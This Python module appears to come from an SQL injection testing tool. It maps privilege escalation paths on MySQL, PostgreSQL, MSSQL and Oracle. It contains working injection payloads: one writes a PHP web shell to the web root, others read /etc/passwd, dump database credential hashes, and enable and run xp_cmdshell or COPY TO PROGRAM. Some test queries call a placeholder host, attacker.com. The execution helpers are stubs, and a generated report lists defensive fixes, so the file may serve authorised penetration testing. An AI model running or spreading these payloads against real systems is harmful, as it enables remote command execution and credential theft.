"""
Advanced Privilege Escalation Detection Module

Automatically detects privilege escalation opportunities and dangerous capabilities
in SQL injection vulnerabilities across multiple database types.
"""

import logging
import re
from typing import Dict, List, Optional, Any, Tuple
from enum import Enum
from dataclasses import dataclass

logger = logging.getLogger(__name__)


class PrivilegeLevel(Enum):
    """Privilege levels"""
    NONE = "none"
    USER = "user"
    ELEVATED = "elevated"
    ADMIN = "admin"
    DBA = "dba"
    SYSTEM = "system"


class DangerousCapability(Enum):
    """Dangerous capabilities that enable privilege escalation"""
    FILE_READ = "file_read"
    FILE_WRITE = "file_write"
    COMMAND_EXECUTION = "command_execution"
    NETWORK_ACCESS = "network_access"
    REGISTRY_ACCESS = "registry_access"
    CREDENTIAL_ACCESS = "credential_access"
    DATABASE_LINKING = "database_linking"
    PROCEDURE_CREATION = "procedure_creation"


@dataclass
class PrivilegeEscalationPath:
    """A potential privilege escalation path"""
    name: str
    description: str
    current_privilege: PrivilegeLevel
    target_privilege: PrivilegeLevel
    capabilities_required: List[DangerousCapability]
    steps: List[str]
    risk_level: str  # low, medium, high, critical
    exploitability: float  # 0.0-1.0
    payloads: List[str]


class AdvancedPrivilegeEscalation:
    """
    Advanced privilege escalation detection and exploitation engine.
    """
    
    # Privilege detection queries per database
    PRIVILEGE_QUERIES = {
        'mysql': {
            'current_user': "SELECT USER()",
            'current_db': "SELECT DATABASE()",
            'all_privileges': """
                SELECT GRANTEE, PRIVILEGE_TYPE, IS_GRANTABLE 
                FROM information_schema.USER_PRIVILEGES 
                WHERE GRANTEE LIKE CONCAT('%',SUBSTRING_INDEX(USER(),'@',1),'%')
            """,
            'file_priv': """
                SELECT File_priv 
                FROM mysql.user 
                WHERE user=SUBSTRING_INDEX(USER(),'@',1)
            """,
            'super_priv': """
                SELECT Super_priv 
                FROM mysql.user 
                WHERE user=SUBSTRING_INDEX(USER(),'@',1)
            """,
            'grant_priv': """
                SELECT Grant_priv 
                FROM mysql.user 
                WHERE user=SUBSTRING_INDEX(USER(),'@',1)
            """,
            'process_priv': """
                SELECT Process_priv 
                FROM mysql.user 
                WHERE user=SUBSTRING_INDEX(USER(),'@',1)
            """,
            'reload_priv': """
                SELECT Reload_priv 
                FROM mysql.user 
                WHERE user=SUBSTRING_INDEX(USER(),'@',1)
            """,
            'shutdown_priv': """
                SELECT Shutdown_priv 
                FROM mysql.user 
                WHERE user=SUBSTRING_INDEX(USER(),'@',1)
            """,
        },
        'postgresql': {
            'current_user': "SELECT current_user",
            'current_db': "SELECT current_database()",
            'is_superuser': """
                SELECT usesuper 
                FROM pg_user 
                WHERE usename=current_user
            """,
            'can_create_db': """
                SELECT usecreatedb 
                FROM pg_user 
                WHERE usename=current_user
            """,
            'can_create_role': """
                SELECT usecreaterole 
                FROM pg_user 
                WHERE usename=current_user
            """,
            'role_memberships': """
                SELECT rolname 
                FROM pg_roles 
                WHERE oid IN (SELECT roleid FROM pg_auth_members WHERE member = 
                    (SELECT oid FROM pg_roles WHERE rolname=current_user))
            """,
        },
        'mssql': {
            'current_user': "SELECT SYSTEM_USER",
            'current_db': "SELECT DB_NAME()",
            'is_sysadmin': "SELECT IS_SRVROLEMEMBER('sysadmin')",
            'is_db_owner': "SELECT IS_MEMBER('db_owner')",
            'is_securityadmin': "SELECT IS_SRVROLEMEMBER('securityadmin')",
            'xp_cmdshell_enabled': """
                SELECT value 
                FROM sys.configurations 
                WHERE name='xp_cmdshell'
            """,
            'clr_enabled': """
                SELECT value 
                FROM sys.configurations 
                WHERE name='clr enabled'
            """,
            'ole_automation': """
                SELECT value 
                FROM sys.configurations 
                WHERE name='Ole Automation Procedures'
            """,
        },
        'oracle': {
            'current_user': "SELECT USER FROM DUAL",
            'current_schema': "SELECT SYS_CONTEXT('USERENV','CURRENT_SCHEMA') FROM DUAL",
            'is_dba': """
                SELECT COUNT(*) 
                FROM dba_role_privs 
                WHERE grantee=USER AND granted_role='DBA'
            """,
            'system_privileges': """
                SELECT PRIVILEGE 
                FROM dba_sys_privs 
                WHERE grantee=USER
            """,
            'role_privileges': """
                SELECT GRANTED_ROLE 
                FROM dba_role_privs 
                WHERE grantee=USER
            """,
            'java_enabled': """
                SELECT VALUE 
                FROM v$option 
                WHERE parameter='Java'
            """,
        },
        'sqlite': {
            'current_db': "SELECT file FROM pragma_database_list WHERE name='main'",
        }
    }
    
    # Dangerous capability tests
    CAPABILITY_TESTS = {
        'mysql': {
            DangerousCapability.FILE_READ: {
                'test': "SELECT LOAD_FILE('/etc/passwd')",
                'indicators': ['/root:', '/bin/bash', '/bin/sh'],
            },
            DangerousCapability.FILE_WRITE: {
                'test': "SELECT 'test' INTO OUTFILE '/tmp/sqltest.txt'",
                'indicators': ['success', 'created'],
            },
            DangerousCapability.CREDENTIAL_ACCESS: {
                'test': "SELECT user,authentication_string FROM mysql.user",
                'indicators': ['root', 'admin', 'mysql_native_password'],
            },
        },
        'postgresql': {
            DangerousCapability.FILE_READ: {
                'test': "SELECT pg_read_file('/etc/passwd',0,10000)",
                'indicators': ['/root:', '/bin/bash'],
            },
            DangerousCapability.COMMAND_EXECUTION: {
                'test': "COPY (SELECT version()) TO PROGRAM 'echo test'",
                'indicators': ['success', 'PostgreSQL'],
            },
            DangerousCapability.NETWORK_ACCESS: {
                'test': "SELECT dblink_connect('host=attacker.com')",
                'indicators': ['success', 'connected'],
            },
        },
        'mssql': {
            DangerousCapability.COMMAND_EXECUTION: {
                'test': "EXEC xp_cmdshell 'whoami'",
                'indicators': ['nt authority', 'system', 'administrator'],
            },
            DangerousCapability.FILE_READ: {
                'test': "EXEC xp_cmdshell 'type C:\\Windows\\win.ini'",
                'indicators': ['[fonts]', '[extensions]'],
            },
            DangerousCapability.REGISTRY_ACCESS: {
                'test': "EXEC xp_regread 'HKEY_LOCAL_MACHINE','SYSTEM\\CurrentControlSet\\Services\\MSSQLSERVER'",
                'indicators': ['ImagePath', 'ObjectName'],
            },
        },
        'oracle': {
            DangerousCapability.FILE_READ: {
                'test': "SELECT UTL_FILE.FOPEN('/etc','passwd','R')",
                'indicators': ['file', 'handle'],
            },
            DangerousCapability.NETWORK_ACCESS: {
                'test': "SELECT UTL_HTTP.REQUEST('http://attacker.com/') FROM DUAL",
                'indicators': ['success', 'http'],
            },
            DangerousCapability.COMMAND_EXECUTION: {
                'test': """
                    BEGIN
                        DBMS_JAVA.SET_PROPERTY('oracle.aurora.security.AllowExec','true');
                    END;
                """,
                'indicators': ['success', 'enabled'],
            },
        },
    }
    
    # Privilege escalation paths
    ESCALATION_PATHS = {
        'mysql': [
            {
                'name': 'FILE Privilege to System Access',
                'description': 'Use FILE privilege to write web shell or read sensitive files',
                'current': PrivilegeLevel.USER,
                'target': PrivilegeLevel.SYSTEM,
                'capabilities': [DangerousCapability.FILE_WRITE],
                'steps': [
                    'Verify FILE privilege',
                    'Write web shell to web root (INTO OUTFILE)',
                    'Access web shell for command execution',
                ],
                'risk': 'critical',
                'exploitability': 0.8,
            },
            {
                'name': 'User-Defined Function (UDF) Privilege Escalation',
                'description': 'Create malicious UDF for command execution',
                'current': PrivilegeLevel.USER,
                'target': PrivilegeLevel.SYSTEM,
                'capabilities': [DangerousCapability.FILE_WRITE, DangerousCapability.PROCEDURE_CREATION],
                'steps': [
                    'Write malicious UDF library to plugin directory',
                    'Create function using CREATE FUNCTION',
                    'Execute function for command execution',
                ],
                'risk': 'critical',
                'exploitability': 0.6,
            },
        ],
        'postgresql': [
            {
                'name': 'COPY TO PROGRAM Command Execution',
                'description': 'Use COPY TO PROGRAM to execute system commands',
                'current': PrivilegeLevel.USER,
                'target': PrivilegeLevel.SYSTEM,
                'capabilities': [DangerousCapability.COMMAND_EXECUTION],
                'steps': [
                    'Verify superuser privileges',
                    'Use COPY TO PROGRAM to execute commands',
                    'Exfiltrate command output',
                ],
                'risk': 'critical',
                'exploitability': 0.9,
            },
            {
                'name': 'Extension-based Privilege Escalation',
                'description': 'Load malicious extension for command execution',
                'current': PrivilegeLevel.USER,
                'target': PrivilegeLevel.SYSTEM,
                'capabilities': [DangerousCapability.FILE_WRITE],
                'steps': [
                    'Write malicious .so library',
                    'Load extension using CREATE EXTENSION',
                    'Execute extension functions',
                ],
                'risk': 'high',
                'exploitability': 0.5,
            },
        ],
        'mssql': [
            {
                'name': 'xp_cmdshell Command Execution',
                'description': 'Enable and use xp_cmdshell for direct command execution',
                'current': PrivilegeLevel.USER,
                'target': PrivilegeLevel.SYSTEM,
                'capabilities': [DangerousCapability.COMMAND_EXECUTION],
                'steps': [
                    'Enable xp_cmdshell (if disabled)',
                    'Execute system commands via xp_cmdshell',
                    'Escalate to SYSTEM using Token Impersonation',
                ],
                'risk': 'critical',
                'exploitability': 0.95,
            },
            {
                'name': 'OLE Automation Privilege Escalation',
                'description': 'Use OLE Automation for file operations and registry access',
                'current': PrivilegeLevel.USER,
                'target': PrivilegeLevel.ADMIN,
                'capabilities': [DangerousCapability.FILE_WRITE, DangerousCapability.REGISTRY_ACCESS],
                'steps': [
                    'Enable Ole Automation Procedures',
                    'Create OLE objects',
                    'Access file system or registry',
                ],
                'risk': 'high',
                'exploitability': 0.7,
            },
        ],
        'oracle': [
            {
                'name': 'Java Stored Procedure Command Execution',
                'description': 'Create Java stored procedure to execute system commands',
                'current': PrivilegeLevel.USER,
                'target': PrivilegeLevel.SYSTEM,
                'capabilities': [DangerousCapability.COMMAND_EXECUTION, DangerousCapability.PROCEDURE_CREATION],
                'steps': [
                    'Verify CREATE PROCEDURE privilege',
                    'Create Java stored procedure with Runtime.exec',
                    'Execute procedure to run system commands',
                ],
                'risk': 'critical',
                'exploitability': 0.6,
            },
        ],
    }
    
    def __init__(self):
        """Initialize privilege escalation detector"""
        self.detected_privileges = {}
        self.detected_capabilities = {}
        self.escalation_paths = []
        logger.info("Advanced privilege escalation detector initialized")
    
    def detect_current_privileges(self, engine, url: str, method: str,
                                 vulnerable_param: str, param_type: str,
                                 db_type: str, **kwargs) -> Dict[str, Any]:
        """
        Detect current user privileges.
        
        Args:
            engine: SQL injection engine for making requests
            url: Target URL
            method: HTTP method
            vulnerable_param: Vulnerable parameter
            param_type: Parameter type (GET/POST)
            db_type: Database type
            **kwargs: Additional parameters (params, data, cookies, headers)
        
        Returns:
            Dictionary of detected privileges
        """
        privileges = {
            'user': None,
            'database': None,
            'privilege_level': PrivilegeLevel.NONE,
            'specific_privileges': [],
            'is_admin': False,
            'is_dba': False,
        }
        
        queries = self.PRIVILEGE_QUERIES.get(db_type, {})
        
        # Detect current user
        if 'current_user' in queries:
            user = self._extract_via_union(
                engine, url, method, vulnerable_param, param_type,
                queries['current_user'], db_type, **kwargs
            )
            if user:
                privileges['user'] = user
                logger.info(f"Detected current user: {user}")
        
        # Detect current database
        if 'current_db' in queries:
            database = self._extract_via_union(
                engine, url, method, vulnerable_param, param_type,
                queries['current_db'], db_type, **kwargs
            )
            if database:
                privileges['database'] = database
                logger.info(f"Detected current database: {database}")
        
        # Detect specific privileges
        privilege_level = PrivilegeLevel.USER
        
        if db_type == 'mysql':
            # Check MySQL privileges
            if self._check_privilege(engine, url, method, vulnerable_param, 
                                    param_type, queries.get('super_priv'), **kwargs):
                privileges['specific_privileges'].append('SUPER')
                privilege_level = PrivilegeLevel.DBA
                privileges['is_dba'] = True
            
            if self._check_privilege(engine, url, method, vulnerable_param,
                                    param_type, queries.get('file_priv'), **kwargs):
                privileges['specific_privileges'].append('FILE')
            
            if self._check_privilege(engine, url, method, vulnerable_param,
                                    param_type, queries.get('grant_priv'), **kwargs):
                privileges['specific_privileges'].append('GRANT')
                privilege_level = max(privilege_level, PrivilegeLevel.ADMIN)
        
        elif db_type == 'postgresql':
            # Check PostgreSQL privileges
            if self._check_privilege(engine, url, method, vulnerable_param,
                                    param_type, queries.get('is_superuser'), **kwargs):
                privileges['specific_privileges'].append('SUPERUSER')
                privilege_level = PrivilegeLevel.DBA
                privileges['is_dba'] = True
        
        elif db_type == 'mssql':
            # Check SQL Server privileges
            if self._check_privilege(engine, url, method, vulnerable_param,
                                    param_type, queries.get('is_sysadmin'), **kwargs):
                privileges['specific_privileges'].append('sysadmin')
                privilege_level = PrivilegeLevel.DBA
                privileges['is_dba'] = True
                privileges['is_admin'] = True
        
        privileges['privilege_level'] = privilege_level
        self.detected_privileges = privileges
        
        logger.info(f"Detected privilege level: {privilege_level.value}")
        return privileges
    
    def detect_dangerous_capabilities(self, engine, url: str, method: str,
                                     vulnerable_param: str, param_type: str,
                                     db_type: str, **kwargs) -> Dict[DangerousCapability, bool]:
        """
        Detect dangerous capabilities available to current user.
        
        Args:
            engine: SQL injection engine
            url: Target URL
            method: HTTP method
            vulnerable_param: Vulnerable parameter
            param_type: Parameter type
            db_type: Database type
            **kwargs: Additional parameters
        
        Returns:
            Dictionary mapping capabilities to availability
        """
        capabilities = {}
        
        capability_tests = self.CAPABILITY_TESTS.get(db_type, {})
        
        for capability, test_info in capability_tests.items():
            try:
                # Test the capability (simplified - would need actual implementation)
                result = self._test_capability(
                    engine, url, method, vulnerable_param, param_type,
                    test_info['test'], test_info['indicators'],
                    db_type, **kwargs
                )
                
                capabilities[capability] = result
                
                if result:
                    logger.warning(f"Dangerous capability detected: {capability.value}")
            
            except Exception as e:
                logger.debug(f"Capability test failed for {capability.value}: {e}")
                capabilities[capability] = False
        
        self.detected_capabilities = capabilities
        return capabilities
    
    def find_escalation_paths(self, db_type: str,
                             privileges: Dict[str, Any],
                             capabilities: Dict[DangerousCapability, bool]) -> List[PrivilegeEscalationPath]:
        """
        Identify available privilege escalation paths.
        
        Args:
            db_type: Database type
            privileges: Detected privileges
            capabilities: Detected capabilities
        
        Returns:
            List of available escalation paths
        """
        paths = []
        
        escalation_templates = self.ESCALATION_PATHS.get(db_type, [])
        
        for template in escalation_templates:
            # Check if all required capabilities are available
            required_caps = template['capabilities']
            available = all(capabilities.get(cap, False) for cap in required_caps)
            
            if available or len([c for c in required_caps if capabilities.get(c, False)]) > 0:
                # Generate payloads for this path
                payloads = self._generate_escalation_payloads(
                    db_type, template['name'], privileges
                )
                
                path = PrivilegeEscalationPath(
                    name=template['name'],
                    description=template['description'],
                    current_privilege=template['current'],
                    target_privilege=template['target'],
                    capabilities_required=required_caps,
                    steps=template['steps'],
                    risk_level=template['risk'],
                    exploitability=template['exploitability'] if available else template['exploitability'] * 0.5,
                    payloads=payloads
                )
                
                paths.append(path)
                logger.info(f"Found escalation path: {path.name} (risk: {path.risk_level})")
        
        self.escalation_paths = paths
        return paths
    
    def generate_report(self, db_type: str) -> str:
        """
        Generate comprehensive privilege escalation report.
        
        Args:
            db_type: Database type
        
        Returns:
            Formatted report string
        """
        report = []
        report.append("=" * 70)
        report.append("PRIVILEGE ESCALATION ANALYSIS REPORT")
        report.append("=" * 70)
        
        # Current privileges section
        if self.detected_privileges:
            report.append("\n[*] CURRENT PRIVILEGES")
            report.append("-" * 70)
            report.append(f"User: {self.detected_privileges.get('user', 'Unknown')}")
            report.append(f"Database: {self.detected_privileges.get('database', 'Unknown')}")
            report.append(f"Privilege Level: {self.detected_privileges.get('privilege_level', PrivilegeLevel.NONE).value.upper()}")
            
            if self.detected_privileges.get('is_dba'):
                report.append("⚠️  DBA PRIVILEGES DETECTED")
            
            if self.detected_privileges.get('specific_privileges'):
                report.append(f"\nSpecific Privileges:")
                for priv in self.detected_privileges['specific_privileges']:
                    report.append(f"  • {priv}")
        
        # Dangerous capabilities section
        if self.detected_capabilities:
            dangerous_found = [cap for cap, available in self.detected_capabilities.items() if available]
            
            if dangerous_found:
                report.append("\n[!] DANGEROUS CAPABILITIES")
                report.append("-" * 70)
                for capability in dangerous_found:
                    report.append(f"  🔴 {capability.value.upper().replace('_', ' ')}")
        
        # Escalation paths section
        if self.escalation_paths:
            report.append("\n[!] PRIVILEGE ESCALATION PATHS")
            report.append("-" * 70)
            
            for i, path in enumerate(self.escalation_paths, 1):
                report.append(f"\n{i}. {path.name}")
                report.append(f"   Risk Level: {path.risk_level.upper()}")
                report.append(f"   Exploitability: {path.exploitability:.1%}")
                report.append(f"   {path.current_privilege.value.upper()} → {path.target_privilege.value.upper()}")
                report.append(f"\n   Description: {path.description}")
                
                report.append(f"\n   Required Capabilities:")
                for cap in path.capabilities_required:
                    status = "✓" if self.detected_capabilities.get(cap, False) else "✗"
                    report.append(f"     {status} {cap.value.replace('_', ' ').title()}")
                
                report.append(f"\n   Escalation Steps:")
                for j, step in enumerate(path.steps, 1):
                    report.append(f"     {j}. {step}")
        
        # Recommendations
        report.append("\n[*] RECOMMENDATIONS")
        report.append("-" * 70)
        
        if self.detected_capabilities.get(DangerousCapability.COMMAND_EXECUTION):
            report.append("  • CRITICAL: Disable command execution features immediately")
        
        if self.detected_capabilities.get(DangerousCapability.FILE_WRITE):
            report.append("  • HIGH: Restrict file write permissions")
        
        if self.detected_privileges.get('is_dba'):
            report.append("  • HIGH: Application should not run with DBA privileges")
        
        report.append("  • Apply least privilege principle")
        report.append("  • Use parameterized queries")
        report.append("  • Implement input validation")
        report.append("  • Regular security audits")
        
        report.append("\n" + "=" * 70)
        
        return "\n".join(report)
    
    # Helper methods
    
    def _extract_via_union(self, engine, url: str, method: str,
                          vulnerable_param: str, param_type: str,
                          query: str, db_type: str, **kwargs) -> Optional[str]:
        """Extract data using UNION-based injection"""
        # This would use the engine's UNION extraction capabilities
        # Simplified for now
        return None
    
    def _check_privilege(self, engine, url: str, method: str,
                        vulnerable_param: str, param_type: str,
                        query: Optional[str], **kwargs) -> bool:
        """Check if a specific privilege exists"""
        if not query:
            return False
        # Would implement actual privilege checking
        return False
    
    def _test_capability(self, engine, url: str, method: str,
                        vulnerable_param: str, param_type: str,
                        test_query: str, indicators: List[str],
                        db_type: str, **kwargs) -> bool:
        """Test if a capability is available"""
        # Would implement actual capability testing
        return False
    
    def _generate_escalation_payloads(self, db_type: str,
                                     escalation_name: str,
                                     privileges: Dict[str, Any]) -> List[str]:
        """Generate specific payloads for escalation path"""
        payloads = []
        
        if db_type == 'mysql' and 'FILE' in escalation_name.upper():
            payloads.extend([
                "' UNION SELECT '<?php system($_GET[\"cmd\"]); ?>' INTO OUTFILE '/var/www/html/shell.php'--",
                "' UNION SELECT LOAD_FILE('/etc/passwd')--",
            ])
        
        elif db_type == 'postgresql' and 'COPY' in escalation_name.upper():
            payloads.extend([
                "'; COPY (SELECT version()) TO PROGRAM 'whoami'--",
                "'; CREATE TABLE cmd_exec(cmd_output text)--",
            ])
        
        elif db_type == 'mssql' and 'xp_cmdshell' in escalation_name:
            payloads.extend([
                "'; EXEC sp_configure 'show advanced options',1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE--",
                "'; EXEC xp_cmdshell 'whoami'--",
            ])
        
        return payloads
